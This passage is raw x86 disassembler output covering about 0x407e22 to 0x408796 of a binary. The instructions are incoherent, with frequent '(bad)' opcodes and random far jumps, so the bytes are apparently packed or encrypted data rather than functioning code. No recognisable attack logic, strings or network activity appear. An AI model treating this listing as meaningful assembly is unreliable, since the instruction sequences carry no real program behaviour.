  407e22:	or     cl,ch
  407e24:	(bad)  
  407e25:	pop    ss
  407e26:	mov    ch,0xc5
  407e28:	xor    al,0xbb
  407e2a:	imul   cl
  407e2c:	mov    WORD PTR [eax],ss
  407e2e:	xchg   cl,ch
  407e30:	(bad)  
  407e31:	xchg   esp,eax
  407e32:	mov    ebx,DWORD PTR [edi+eiz*2-0x3d]
  407e36:	not    BYTE PTR [esi+0x688c8b8f]
  407e3c:	(bad)  
  407e3d:	xchg   esp,eax
  407e3e:	or     BYTE PTR [eax],al
	...
  407e54:	jge    0x407e16
  407e56:	imul   dh
  407e58:	arpl   WORD PTR [ebp+edi*2+0x8],sp
  407e5c:	or     eax,0x22ffb7cc
  407e61:	fs mov ebp,0xf764eaec
  407e67:	call   FWORD PTR [eax-0x41]
  407e6a:	out    dx,al
  407e6b:	rcl    BYTE PTR [esp+eiz*2],1
  407e6e:	idiv   edi
  407e70:	sbb    BYTE PTR [edi-0x1],bl
  407e73:	call   edx
  407e75:	fs jge 0x407e80
  407e78:	mov    ebp,0xa2ffb951
  407e7d:	fs mov ebp,0xf7649ae4
  407e83:	jmp    FWORD PTR [eax]
  407e85:	mov    edi,0x64e4b4ee
  407e8a:	idiv   edi
  407e8c:	fsubr  DWORD PTR [ebx-0x1]
  407e8f:	inc    DWORD PTR [edx+0x7d087d64]
  407e95:	shl    DWORD PTR [edi-0x42b4dd01],cl
  407e9b:	loopne 0x407eb7
  407e9d:	dec    ebx
  407e9e:	idiv   edi
  407ea0:	cwde   
  407ea1:	mov    edi,0x4b2498ee
  407ea6:	test   DWORD PTR [ebx-0x97e0],0x1b7c8fe2
  407eb0:	and    ax,0xf7d8
  407eb4:	ror    BYTE PTR [edx+0xc],cl
  407eb7:	jne    0x407eb9
	...
  407ec9:	add    BYTE PTR [eax],al
  407ecb:	add    bh,al
  407ecd:	cmp    eax,0x4b1ad88d
  407ed2:	idiv   edi
  407ed4:	aad    0x49
  407ed6:	jge    0x407ee0
  407ed8:	sbb    eax,0x22ffb7bc
  407edd:	pop    edi
  407ede:	add    ch,BYTE PTR [edx-0x74]
  407ee1:	lods   eax,DWORD PTR ds:[esi]
  407ee2:	inc    ebp
  407ee3:	jne    0x407e69
  407ee5:	adc    eax,0x11abb0f4
  407eea:	inc    edi
  407eeb:	mov    ch,0xa8
  407eed:	inc    ecx
  407eee:	inc    edi
  407eef:	jmp    DWORD PTR [eax+esi*2+0x2993ff90]
  407ef6:	xchg   ecx,eax
  407ef7:	in     al,dx
  407ef8:	xor    DWORD PTR [ebx],0x47
  407efb:	call   0xff879ecd
  407f00:	jnp    0x407f1b
  407f02:	push   esp
  407f03:	div    DWORD PTR [ebx+0x4b]
  407f06:	push   esp
  407f07:	and    BYTE PTR ss:[ebx+0x47],dl
  407f0b:	call   FWORD PTR [ecx]
  407f0d:	dec    esp
  407f0e:	pop    edi
  407f0f:	call   FWORD PTR [ebx+0x54]
  407f12:	adc    esi,DWORD PTR [ebx+edx*2+0x64b5476b]
  407f19:	fwait
  407f1a:	inc    edi
  407f1b:	push   DWORD PTR [esp+ecx*8]
  407f1e:	sahf   
  407f1f:	(bad)  
  407f20:	cmp    esp,DWORD PTR [ebx-0x74c40f6f]
  407f26:	inc    edi
  407f27:	call   0xff87f6ad
  407f2c:	and    esi,ecx
  407f2e:	inc    edx
  407f2f:	jmp    0x407f34
	...
  407f44:	inc    ecx
  407f45:	rol    DWORD PTR [ebp-0x1],0x13
  407f49:	inc    ecx
  407f4a:	inc    edi
  407f4b:	call   0x4b8b0d
  407f50:	aad    0xed
  407f52:	bnd jmp DWORD PTR [eax+0x36]
  407f56:	push   edi
  407f57:	or     eax,0xffffffc7
  407f5a:	sar    bh,1
  407f5c:	jne    0x407f1e
  407f5e:	inc    ebp
  407f5f:	jne    0x407ef5
  407f61:	jecxz  0x407f90
  407f63:	mov    cl,0xdb
  407f65:	add    dh,BYTE PTR [ebp+eax*2-0x30]
  407f69:	push   ebx
  407f6a:	lock push edi
  407f6c:	dec    ebp
  407f6d:	xchg   esp,eax
  407f6e:	loope  0x407fbe
  407f70:	cmp    DWORD PTR [ecx+ebx*4-0x62464730],ecx
  407f77:	dec    esi
  407f78:	cmp    DWORD PTR [eax-0x536c277b],edi
  407f7e:	adc    dl,BYTE PTR [ebp+0x41b7b9a3]
  407f84:	nop
  407f85:	xchg   esp,eax
  407f86:	adc    al,0x7b
  407f88:	mov    al,ds:0x833fad13
  407f8d:	mov    ecx,0xb8c9806d
  407f92:	mov    al,0x4e
  407f94:	add    DWORD PTR [ecx+0x4c5f185e],ecx
  407f9a:	mov    al,ds:0x6db17403
  407f9f:	add    ecx,DWORD PTR [ebp+ecx*4+0x5910fe21]
  407fa6:	jecxz  0x407fab
	...
  407fbc:	mov    ecx,ss
  407fbe:	stos   DWORD PTR es:[edi],eax
  407fbf:	dec    ebx
  407fc0:	mov    WORD PTR [ecx+eiz*8+0x1d4f4b03],ss
  407fc7:	dec    esi
  407fc8:	xchg   ebx,eax
  407fc9:	xchg   esp,eax
  407fca:	loope  0x407fa5
  407fcc:	xor    ebp,DWORD PTR [ebx]
  407fce:	loope  0x407fa9
  407fd0:	sub    ebp,DWORD PTR [ebx]
  407fd2:	loope  0x407f54
  407fd4:	leave  
  407fd5:	rcl    BYTE PTR [eax-0xa3fee80],0x4d
  407fdc:	adc    esp,DWORD PTR [esi+eiz*8-0x29]
  407fe0:	add    edi,DWORD PTR [ecx-0x50bafad]
  407fe6:	jne    0x407fec
  407fe8:	mov    WORD PTR [ebp-0x5477275f],cs
  407fee:	add    al,BYTE PTR [edx]
  407ff0:	mov    WORD PTR [ecx+ebx*2-0x1eacab63],ss
  407ff7:	dec    esp
  407ff8:	popa   
  407ff9:	mov    BYTE PTR [eax],cl
  407ffb:	rcl    esi,0x1
  407ffe:	imul   DWORD PTR [esi+0x6c84e445]
  408004:	fs shl esi,0x9e
  408008:	add    BYTE PTR [ebx-0x20],ah
  40800b:	sbb    DWORD PTR es:[ecx-0x3bec9f0a],edi
  408012:	inc    BYTE PTR [esi-0x5272f8af]
  408018:	inc    ecx
  408019:	mov    ecx,0xccb019f6
  40801e:	dec    edi
  40801f:	sub    BYTE PTR [eax],al
	...
  408031:	add    BYTE PTR [eax],al
  408033:	add    BYTE PTR [eax-0x26a64349],dl
  408039:	mov    bh,0xf6
  40803b:	pop    esi
  40803c:	mov    ds:0x8fa83fe3,eax
  408041:	lods   al,BYTE PTR ds:[esi]
  408042:	pop    eax
  408043:	xchg   edi,eax
  408044:	fnstenv [edi-0x400b9380]
  40804a:	idiv   BYTE PTR [esi]
  40804c:	ss mov eax,0x55204b6e
  408052:	or     BYTE PTR [esi],ch
  408054:	and    eax,ebp
  408056:	(bad)  
  408057:	shl    DWORD PTR es:[edi+0x54f83a3c],1
  40805e:	or     BYTE PTR [ecx],al
  408060:	popf   
  408061:	(bad)  
  408062:	test   BYTE PTR [esi],0xa7
  408065:	adc    esp,esp
  408067:	(bad)  
  408068:	shl    BYTE PTR [edi-0x50c8169f],1
  40806e:	dec    edi
  40806f:	test   al,0x8f
  408071:	mov    bh,0xbc
  408073:	stc    
  408074:	pusha  
  408075:	mov    bh,0xf6
  408077:	out    0x9a,al
  408079:	jecxz  0x4080ba
  40807b:	sub    BYTE PTR [eax+0x409f1cac],dl
  408081:	mov    bh,0x80
  408083:	fs inc edi
  408085:	mov    edi,0xddca00f6
  40808a:	mul    BYTE PTR [edi+0x17]
  40808d:	in     al,dx
  40808e:	inc    edi
  40808f:	add    BYTE PTR [edx],bl
  408091:	pop    ds
  408092:	clc    
  408093:	idiv   edx
  408095:	dec    eax
  408096:	div    DWORD PTR ds:0x0
	...
  4080ac:	push   es
  4080ad:	cld    
  4080ae:	inc    edi
  4080af:	add    BYTE PTR ds:0x1affbd61,bl
  4080b5:	cmp    ecx,DWORD PTR [ebp-0x8b6fd20]
  4080bb:	lea    esi,[eax]
  4080bd:	imul   edi,edi,0xffffffff
  4080c0:	sbb    al,BYTE PTR [ebx]
  4080c2:	outs   dx,DWORD PTR ds:[esi]
  4080c3:	in     eax,dx
  4080c4:	jge    0x408099
  4080c6:	idiv   dh
  4080c8:	shl    BYTE PTR [ebx-0x1],0xff
  4080cc:	jmp    0xf6d2:0x3dd33d48
  4080d3:	out    0xb1,eax
  4080d5:	push   ds
  4080d6:	idiv   edi
  4080d8:	outs   dx,BYTE PTR ds:[esi]
  4080d9:	push   ebx
  4080da:	jl     0x4080ef
  4080dc:	test   BYTE PTR [esi],0xd0
  4080df:	neg    DWORD PTR [edx+0x6f750c48]
  4080e5:	dec    eax
  4080e6:	cmp    BYTE PTR [edi-0x9850],cl
  4080ec:	push   0x5c
  4080ee:	add    al,bh
  4080f0:	mov    al,0x67
  4080f2:	(bad)  
  4080f3:	call   FWORD PTR [edx+0x35fff6be]
  4080f9:	add    ebp,edi
  4080fb:	xchg   ebp,eax
  4080fc:	addr16 dec eax
  4080fe:	test   DWORD PTR [ebp-0x7c50],0xd56f021a
  408108:	sbb    eax,0x20fef6d2
  40810d:	pusha  
  40810e:	(bad)  
  40810f:	inc    DWORD PTR [eax]
	...
  408121:	add    BYTE PTR [eax],al
  408123:	add    dl,bl
  408125:	dec    edx
  408126:	cmp    eax,0xcd758cd3
  40812b:	push   ebx
  40812d:	cmp    al,0x99
  40812f:	jmp    ebx
  408131:	ror    DWORD PTR [edx+0x74],0x7f
  408135:	sub    al,BYTE PTR [ecx+0x42fddbd0]
  40813b:	add    al,0x41
  40813d:	mov    bl,0x41
  40813f:	xor    BYTE PTR [ebx],dl
  408141:	sub    BYTE PTR [eax],bh
  408143:	idiv   DWORD PTR [ebx-0x34f5a8eb]
  408149:	daa    
  40814a:	cmp    bh,dh
  40814c:	stos   DWORD PTR es:[edi],eax
  40814d:	add    eax,0xad8c000c
  408152:	mov    edx,0x437b3de7
  408157:	dec    DWORD PTR [edi]
  408159:	sub    BYTE PTR [eax-0x9],0x8b
  40815d:	daa    
  40815e:	or     al,0x74
  408160:	ret    
  408161:	sub    al,BYTE PTR [ecx+0x435783d4]
  408167:	add    bh,cl
  408169:	xchg   ebp,eax
  40816a:	(bad)  
  40816b:	call   FWORD PTR [eax]
  40816d:	xor    DWORD PTR [eax],esi
  40816f:	mul    DWORD PTR [ebx+0x4f]
  408172:	mov    esp,0x5b5021fe
  408177:	call   DWORD PTR [ebx+0x54]
  40817a:	xchg   esp,eax
  40817b:	fisttp DWORD PTR [ebx+0x67]
  40817e:	idiv   DWORD PTR [edi-0x42723b48]
  408184:	dec    eax
  408185:	lahf   
  408186:	inc    ebx
  408187:	inc    DWORD PTR [eax]
	...
  408199:	add    BYTE PTR [eax],al
  40819b:	add    BYTE PTR [eax+ebx*1-0x701e0108],cl
  4081a2:	pop    ebx
  4081a3:	jmp    DWORD PTR [ebx]
  4081a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081a6:	push   DWORD PTR [ecx-0x7ab648e5]
  4081ac:	sub    BYTE PTR [edi-0x547300bf],dh
  4081b2:	or     al,BYTE PTR [eax]
  4081b4:	setne  BYTE PTR [edi+ebx*2+0x3d5b603]
  4081bc:	js     0x4081e7
  4081be:	bound  ecx,QWORD PTR [eax+0x4ac5bdf8]
  4081c4:	mov    WORD PTR [eax+0x43],es
  4081c7:	xchg   DWORD PTR [ecx],ebx
  4081c9:	lods   eax,DWORD PTR ds:[esi]
  4081ca:	mov    ebp,0x3594d34a
  4081cf:	lods   eax,DWORD PTR ds:[esi]
  4081d0:	xor    edx,DWORD PTR [edx-0x49fda51f]
  4081d6:	adc    edi,esp
  4081d8:	mov    bl,0x22
  4081da:	inc    edi
  4081db:	dec    edx
  4081dc:	mov    bl,0xb5
  4081de:	push   ebx
  4081df:	push   edi
  4081e0:	mov    ds:0x194a85b5,eax
  4081e5:	mov    WORD PTR [ecx+0x75b5ea61],ds
  4081eb:	dec    edx
  4081ec:	fldcw  WORD PTR [ebp+esi*2-0x44a74b6]
  4081f3:	sti    
  4081f4:	imul   ebx,esp,0xffffff9e
  4081f7:	dec    edx
  4081f8:	jnp    0x4081af
  4081fa:	fwait
  4081fb:	aaa    
  4081fc:	jnp    0x4081b3
  4081fe:	pop    ebp
  4081ff:	dec    edx
	...
  408214:	and    DWORD PTR [eax-0x4a9cb5a3],esi
  40821a:	mov    bl,0xfb
  40821c:	jae    0x40823a
  40821e:	xchg   DWORD PTR [edx+0x53],ecx
  408221:	mov    ch,0x73
  408223:	daa    
  408224:	inc    ebx
  408225:	mov    ch,0x25
  408227:	dec    edx
  408228:	mov    ecx,0xe9af198c
  40822d:	mov    ah,0x15
  40822f:	dec    edx
  408230:	stc    
  408231:	mov    bl,0x15
  408233:	dec    edx
  408234:	sub    esi,DWORD PTR [ebp-0x13d40465]
  40823a:	pop    esi
  40823b:	dec    edx
  40823c:	sbb    esi,DWORD PTR [ebp-0x4ae4a0c5]
  408242:	pop    es
  408243:	mul    BYTE PTR [esi+0xa]
  408246:	mov    ecx,0xbcb555ee
  40824b:	aad    0x5d
  40824d:	mov    ch,0xf6
  40824f:	rol    ebp,1
  408251:	add    esi,edi
  408253:	(bad)  
  408254:	push   ebp
  408255:	(bad)  
  408256:	(bad)  
  408258:	push   ebp
  408259:	mov    ch,0xdf
  40825b:	cmp    eax,0xbef6b4ff
  408260:	add    esi,DWORD PTR [esi+edi*8+0x60ac55b6]
  408267:	js     0x4082be
  408269:	mov    ch,0xf6
  40826b:	pop    esp
  40826c:	pusha  
  40826d:	mov    ebp,0x56509ef6
  408272:	mov    ecx,0x4cb55596
  408277:	xchg   ecx,eax
	...
  40828c:	inc    edi
  40828d:	add    al,0xf5
  40828f:	xchg   BYTE PTR [ebp-0x4b],al
  408292:	jl     0x408311
  408294:	xor    BYTE PTR [edx],bh
  408296:	xchg   ebp,eax
  408297:	jmp    0xe20a602b
  40829c:	(bad)
  4082a0:	adc    ecx,ebx
  4082a2:	sti    
  4082a3:	ror    DWORD PTR [edi+0x5b56063e],cl
  4082a9:	pushf  
  4082aa:	loopne 0x408285
  4082ac:	add    eax,0x1b70f6b4
  4082b1:	mov    al,0x5f
  4082b3:	jmp    0xc1f64647
  4082b8:	add    eax,0x67e9494c
  4082bd:	dec    edi
  4082be:	push   eax
  4082bf:	test   al,0x8f
  4082c1:	mov    bl,0x7c
  4082c3:	icebp  
  4082c4:	xlat   BYTE PTR ds:[ebx]
  4082c5:	dec    edi
  4082c6:	rcl    BYTE PTR [esi],cl
  4082c8:	aad    0x21
  4082ca:	dec    ebp
  4082cb:	adc    eax,ebx
  4082cd:	cmp    ebp,DWORD PTR [ebp-0x9291300]
  4082d3:	addr16 cld 
  4082d5:	inc    DWORD PTR [edi+0x0]
  4082d8:	add    ah,BYTE PTR [ebx-0x67cbb725]
  4082de:	loopne 0x4082fd
  4082e0:	sbb    DWORD PTR [ebp-0x9],ebx
  4082e3:	or     esp,DWORD PTR ds:0xb8892ce4
  4082e9:	inc    esp
  4082ea:	pusha  
  4082eb:	add    ebp,esi
  4082ed:	dec    esp
  4082ee:	mov    dh,0xff
	...
  408304:	cwde   
  408305:	mov    al,0xee
  408307:	mov    ds:0xfff75d00,al
  40830c:	mov    BYTE PTR [eax-0x9],ah
  40830f:	jne    0x40830a
  408311:	pop    esp
  408312:	jge    0x40831c
  408314:	sbb    eax,0x12ffa572
  408319:	pop    ebp
  40831a:	jge    0x408310
  40831c:	or     eax,0x12ffb881
  408321:	shl    BYTE PTR [ebx-0x8679ba8],1
  408327:	jne    0x4082c6
  408329:	dec    edi
  40832a:	idiv   ah
  40832c:	add    bl,BYTE PTR [ebp-0x9]
  40832f:	jne    0x408322
  408331:	pop    esp
  408332:	jge    0x40833c
  408334:	fst    st(6)
  408336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408337:	call   edx
  408339:	outs   dx,BYTE PTR ds:[esi]
  40833a:	retf   0x7504
  40833d:	add    al,BYTE PTR [edx-0xb8c0914]
  408343:	push   0x65
  408345:	rol    DWORD PTR ds:0xeeaf18ff,1
  40834b:	in     eax,0x10
  40834d:	pop    esp
  40834e:	test   DWORD PTR [ecx+0x605ae8],0x68b64c25
  408358:	xchg   ebx,eax
  408359:	inc    DWORD PTR [edi+0x0]
  40835c:	mov    WORD PTR ds:0xbdcd58f5,ss
  408362:	aas    
  408363:	jne    0x4082e9
  408365:	test   DWORD PTR [ebx],edi
  408367:	fld    DWORD PTR [eax]
	...
  408379:	add    BYTE PTR [eax],al
  40837b:	add    BYTE PTR [ebx],dl
  40837d:	mov    dl,0x4e
  40837f:	jne    0x408389
  408381:	stos   BYTE PTR es:[edi],al
  408382:	les    eax,FWORD PTR [edi]
  408384:	hlt    
  408385:	mov    edx,0xe3fbff90
  40838a:	dec    ecx
  40838b:	add    al,0x8c
  40838d:	push   0x10fec73
  408392:	inc    eax
  408393:	push   0xffffff8c
  408395:	push   edi
  408396:	cld    
  408397:	(bad)  
  408398:	popa   
  408399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40839a:	push   edx
  40839b:	stos   BYTE PTR es:[edi],al
  40839c:	and    edx,esi
  40839e:	dec    esi
  40839f:	mov    DWORD PTR [ecx-0x17],edx
  4083a2:	sar    edi,cl
  4083a4:	ret    
  4083a5:	icebp  
  4083a6:	lea    ebp,[eax-0x60]
  4083a9:	push   esp
  4083aa:	int    0xff
  4083ac:	sub    edx,DWORD PTR [ebp+eiz*4-0x26f573c0]
  4083b3:	pop    es
  4083b4:	mov    ah,0x27
  4083b6:	and    eax,0xc869bff
  4083bb:	push   0xffcd743a
  4083c0:	repz out 0xa3,eax
  4083c3:	inc    eax
  4083c4:	mov    WORD PTR [edx+0x19],es
  4083c7:	rol    esp,cl
  4083c9:	cld    
  4083ca:	or     ch,al
  4083cc:	aad    0xe
  4083ce:	dec    edi
  4083cf:	call   DWORD PTR [edi-0xbdc2785]
  4083d5:	lea    esp,[ebp+0x530b8c40]
  4083db:	and    eax,0x504f7318
	...
  4083f4:	mov    ah,0xbb
  4083f6:	or     ch,bh
  4083f8:	add    dl,ah
  4083fa:	out    0x58,al
  4083fc:	int    0x94
  4083fe:	loope  0x4083b3
  408400:	xor    ch,BYTE PTR [eax]
  408402:	stc    
  408403:	pop    ebx
  408404:	jl     0x4083d1
  408406:	sbb    eax,0x518c3447
  40840b:	inc    edi
  40840c:	sbb    esi,DWORD PTR [edx+0x28134773]
  408412:	stc    
  408413:	pop    ebx
  408414:	sbb    BYTE PTR [eax],al
  408416:	inc    BYTE PTR [esi-0x2b]
  408419:	(bad)  
  40841a:	in     al,dx
  40841b:	add    esp,DWORD PTR [ecx+0x1d]
  40841e:	fld    QWORD PTR [edx-0x50c14f38]
  408424:	jne    0x4083ba
  408426:	dec    ebx
  408427:	cmc    
  408428:	loop   0x408451
  40842a:	jmp    0xce402e8a
  40842f:	inc    esi
  408430:	add    eax,0x817ab558
  408435:	dec    ecx
  408436:	sub    ebp,eax
  408438:	ret    
  408439:	push   ds
  40843a:	in     al,0xaa
  40843c:	push   ebx
  40843d:	push   ebx
  40843e:	loope  0x4083c3
  408440:	jae    0x4083d6
  408442:	sbb    eax,0x383633bb
  408447:	lds    esp,FWORD PTR [ebx-0x84576b6]
  40844d:	xchg   esp,eax
  40844e:	loope  0x40844a
  408450:	shr    DWORD PTR [eax],cl
  408452:	int3   
  408453:	lods   eax,DWORD PTR ds:[esi]
  408454:	jae    0x408467
  408456:	cmp    BYTE PTR [esi+0x0],al
	...
  408469:	add    BYTE PTR [eax],al
  40846b:	add    BYTE PTR [ebx-0x3352f5c4],al
  408471:	xchg   esp,eax
  408472:	mov    cl,0x5b
  408474:	cmp    ebp,esp
  408476:	push   ebp
  408477:	inc    esi
  408478:	mov    esp,0x7303e13c
  40847d:	repnz mov al,0x46
  408480:	loope  0x40841e
  408482:	pop    ecx
  408483:	inc    ebx
  408484:	cmp    DWORD PTR [ecx+0xfa5b35],esi
  40848a:	or     BYTE PTR [esi],dh
  40848c:	retf   0x8bd
  40848f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408490:	(bad)  
  408492:	or     BYTE PTR [ebp+eax*8-0x30250ba6],bl
  408499:	jmp    0x408491
  40849b:	push   ss
  40849c:	retf   0xf9b1
  40849f:	aas    
  4084a0:	xchg   DWORD PTR [ecx+0x27ca3c7d],ebx
  4084a6:	hlt    
  4084a7:	(bad)  
  4084a8:	fistp  DWORD PTR [eax-0x4edb1c20]
  4084ae:	test   BYTE PTR [esi-0x123623cf],0x8f
  4084b5:	inc    edi
  4084b6:	or     ebp,0xd
  4084b9:	fdiv   st,st(3)
  4084bb:	inc    ebx
  4084bc:	mov    BYTE PTR [esi],bh
  4084be:	sbb    cl,dh
  4084c0:	retf   
  4084c1:	cwde   
  4084c2:	loopne 0x408459
  4084c4:	hlt    
  4084c5:	mov    al,0xf6
  4084c7:	jo     0x4084d4
  4084c9:	lods   eax,DWORD PTR ds:[esi]
  4084ca:	pop    edi
  4084cb:	jmp    0x41f6465f
	...
  4084e4:	ror    DWORD PTR [ebx+0x49],1
  4084e7:	jmp    0x2891abc3
  4084ec:	nop
  4084ed:	mov    cl,0x7c
  4084ef:	loope  0x408538
  4084f1:	or     eax,edx
  4084f3:	mov    ss,WORD PTR [ecx-0x4f]
  4084f6:	jl     0x40847d
  4084f8:	dec    ecx
  4084f9:	daa    
  4084fa:	add    BYTE PTR [ecx+0x76f700c3],dl
  408500:	(bad)  
  408501:	ror    BYTE PTR [ebx],cl
  408503:	jmp    0x6924a032
  408508:	int3   
  408509:	sar    dh,1
  40850b:	pop    esi
  40850c:	shl    DWORD PTR [ecx],1
  40850e:	dec    ebp
  40850f:	push   ebp
  408510:	sbb    BYTE PTR [edi+0x69d0dd7c],ch
  408516:	fild   DWORD PTR [eax]
  408518:	sbb    eax,0x57e7f6d3
  40851d:	cmp    eax,0x542e0008
  408522:	pop    es
  408523:	test   DWORD PTR [esp+edx*4],eax
  408526:	or     BYTE PTR [eax],al
  408528:	(bad)  
  408529:	out    dx,eax
  40852a:	inc    BYTE PTR [eax]
  40852c:	xor    eax,0xf0c70894
  408531:	pop    edi
  408532:	test   DWORD PTR [edi],0x629425
  408538:	call   DWORD PTR [ebx-0x6be0ff9e]
  40853e:	test   DWORD PTR [ebp+0x1],eax
  408541:	in     al,0x83
  408543:	test   DWORD PTR [ecx],eax
  408545:	popa   
  408546:	idiv   edi
	...
  40855c:	mov    ch,0x59
  40855e:	jge    0x408558
  408560:	retf   0xf2de
  408563:	call   0x48c2e9
  408568:	out    dx,al
  408569:	push   ebx
  40856a:	jl     0x408571
  40856c:	mov    esp,0xb50007cf
  408571:	retf   
  408572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408573:	dec    eax
  408574:	je     0x40850e
  408576:	div    DWORD PTR [ebp-0x27]
  408579:	dec    ebx
  40857a:	lea    esi,[edx-0x74a7a716]
  408580:	in     eax,0x26
  408582:	(bad)  
  408583:	hlt    
  408584:	add    bl,BYTE PTR [ecx-0x9]
  408587:	push   eax
  408588:	push   edi
  408589:	push   eax
  40858a:	jge    0x40853e
  40858c:	or     bl,BYTE PTR [ecx-0x7f]
  40858f:	test   DWORD PTR ds:0xdfff761,eax
  408595:	ins    BYTE PTR es:[edi],dx
  408596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408597:	(bad)  
  408598:	jmp    0x47fa:0x967f6cd
  40859f:	add    dl,cl
  4085a1:	push   ds
  4085a2:	clc    
  4085a3:	test   DWORD PTR [esi+eax*2+0x6aa1ff4c],0x458c40b3
  4085ae:	xor    BYTE PTR [ecx-0x7a8d91b5],dh
  4085b4:	sub    BYTE PTR [esi+0x4c],ch
  4085b7:	jmp    DWORD PTR [esi-0x2a742d43]
  4085bd:	cld    
  4085be:	or     bh,bh
	...
  4085d4:	loope  0x408562
  4085d6:	inc    esp
  4085d7:	jmp    DWORD PTR [ebx]
  4085d9:	xchg   BYTE PTR [esi],al
  4085db:	rol    esp,cl
  4085dd:	cld    
  4085de:	or     ch,al
  4085e0:	loope  0x40864d
  4085e2:	dec    esp
  4085e3:	call   DWORD PTR ds:0x3f75f38
  4085e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ea:	iret   
  4085eb:	push   DWORD PTR [ebx+0x4a]
  4085ee:	mov    ds:0x70b68c40,al
  4085f3:	lock jecxz 0x4085c3
  4085f6:	dec    edx
  4085f7:	call   FWORD PTR [ecx-0x73bf3c16]
  4085fd:	aad    0x9a
  4085ff:	mov    cl,0xd3
  408601:	aad    0x84
  408603:	test   DWORD PTR [ebp+eiz*8+0x4011ff4a],esi
  40860a:	push   0xdbfdbbf7
  40860f:	addr16 jmp 0xab405368
  408615:	inc    edi
  408616:	cmp    al,0xf7
  408618:	mov    ds:0xbf354b05,eax
  40861d:	je     0x4085ec
  40861f:	jmp    FWORD PTR [ebx-0x74008278]
  408625:	mov    ds:0x3aa5744a,eax
  40862a:	mov    esp,ebx
  40862c:	cmp    DWORD PTR [edi],0x4b
  40862f:	add    al,0xf9
  408631:	xchg   esp,eax
  408632:	icebp  
  408633:	inc    edx
  408634:	pushf  
  408635:	sbb    eax,0x246c
	...
  40864a:	add    BYTE PTR [eax],al
  40864c:	pop    ebx
  40864d:	scas   al,BYTE PTR es:[edi]
  40864e:	pop    ebp
  40864f:	aam    0x73
  408651:	ins    BYTE PTR es:[edi],dx
  408652:	ja     0x408697
  408654:	push   ebx
  408655:	mov    edx,0x294c0ed4
  40865a:	out    dx,eax
  40865b:	shr    DWORD PTR [ebx],cl
  40865d:	or     BYTE PTR [edi+0x6bd63b43],0x24
  408664:	cmp    ebp,DWORD PTR [esi-0x6b73e6d3]
  40866a:	loope  0x4085f2
  40866c:	loope  0x408626
  40866e:	adc    eax,0x9d951b43
  408673:	fimul  DWORD PTR [esi]
  408675:	lock sbb al,0x3b
  408678:	or     ebp,DWORD PTR [esi+0x1151b7e0]
  40867e:	cmp    al,0x2c
  408680:	add    ebp,DWORD PTR [esi+0x577803e5]
  408686:	pop    ecx
  408687:	add    al,0x8c
  408689:	mov    ebp,0x9c594296
  40868e:	leave  
  40868f:	outs   dx,DWORD PTR ds:[esi]
  408690:	es scas al,BYTE PTR es:[edi]
  408692:	lds    eax,FWORD PTR [edx+0x19]
  408695:	shl    DWORD PTR [ebp+0x3badcb42],0xc
  40869c:	mov    ah,0x94
  40869e:	mov    al,BYTE PTR [edx-0x45]
  4086a1:	lods   eax,DWORD PTR ds:[esi]
  4086a2:	jnp    0x4086cf
  4086a4:	mov    ebx,0x2142adad
  4086a9:	pushf  
  4086aa:	cdq    
  4086ab:	xor    eax,0x429dadf6
	...
  4086c4:	loope  0x40867e
  4086c6:	popf   
  4086c7:	inc    edx
  4086c8:	xchg   ebx,eax
  4086c9:	lods   eax,DWORD PTR ds:[esi]
  4086ca:	repz or esi,DWORD PTR [eax+edi*4+0x5a]
  4086cf:	inc    edx
  4086d0:	sub    DWORD PTR [ebp-0x5a50c3f9],0xfffffff6
  4086d7:	outs   dx,BYTE PTR ds:[esi]
  4086d8:	into   
  4086d9:	daa    
  4086da:	add    BYTE PTR [ecx+0x23],dl
  4086dd:	sti    
  4086de:	neg    BYTE PTR [esi-0x32]
  4086e1:	out    0xeb,eax
  4086e3:	pop    esi
  4086e4:	into   
  4086e5:	lods   eax,DWORD PTR ds:[esi]
  4086e6:	fist   WORD PTR [ecx+0x46f6addc]
  4086ec:	(bad)  
  4086ed:	sar    dh,0x3e
  4086f0:	into   
  4086f1:	mov    esp,0xadce84a4
  4086f6:	div    BYTE PTR [edi+eiz*2-0x5b]
  4086fa:	mul    BYTE PTR [esi]
  4086fc:	ja     0x4086f0
  4086fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ff:	push   ds
  408700:	into   
  408701:	lods   eax,DWORD PTR ds:[esi]
  408702:	mov    esp,0xf6ad5619
  408707:	add    esi,esi
  408709:	(bad)  
  40870a:	test   BYTE PTR [esi],0x4e
  40870d:	push   edi
  40870e:	lock adc BYTE PTR ds:0x4df6f6af,bh
  408715:	daa    
  408716:	hlt    
  408717:	add    DWORD PTR [edx+0xb],edi
  40871a:	or     cl,ch
  40871c:	push   esi
  40871d:	sar    bh,cl
  40871f:	call   0x6b24a0de
  408724:	inc    esp
  408725:	mov    al,0x61
  408727:	jmp    0x40872c
	...
  40873c:	and    DWORD PTR [edx-0x4367c309],eax
  408742:	mov    al,ds:0x80ad4d93
  408747:	sub    al,0x4c
  408749:	cmp    al,0xa5
  40874b:	adc    bh,cl
  40874d:	lods   al,BYTE PTR ds:[esi]
  40874e:	cmc    
  40874f:	sbb    al,0x98
  408751:	mov    esp,0xad4d9f1d
  408756:	neg    BYTE PTR [esp+ecx*2]
  408759:	lods   eax,DWORD PTR ds:[esi]
  40875a:	jl     0x40873d
  40875c:	addr16 enter 0xa1,0x12
  408761:	push   esi
  408762:	rol    edx,0x69
  408765:	cwde   
  408766:	pop    ebp
  408767:	mov    edx,DWORD PTR [ecx]
  408769:	adc    cl,ah
  40876b:	cld    
  40876c:	(bad)  
  40876d:	nop
  40876e:	bound  edx,QWORD PTR [edx+esi*8]
  408771:	jecxz  0x408781
  408773:	call   0x37c1e5
  408778:	in     al,dx
  408779:	shl    edx,cl
  40877b:	push   0xbee79865
  408780:	pop    ebp
  408781:	dec    ebp
  408782:	push   ecx
  408783:	inc    ecx
  408784:	xor    eax,0xe459c400
  408789:	xchg   edi,eax
  40878a:	div    DWORD PTR [ebp+0x2d]
  40878d:	sub    BYTE PTR [ebx-0x2a],0x72
  408791:	push   ebp
  408792:	div    DWORD PTR [ebp-0x7f]
  408795:	push   ebp
  408796:	jge    0x4087a0
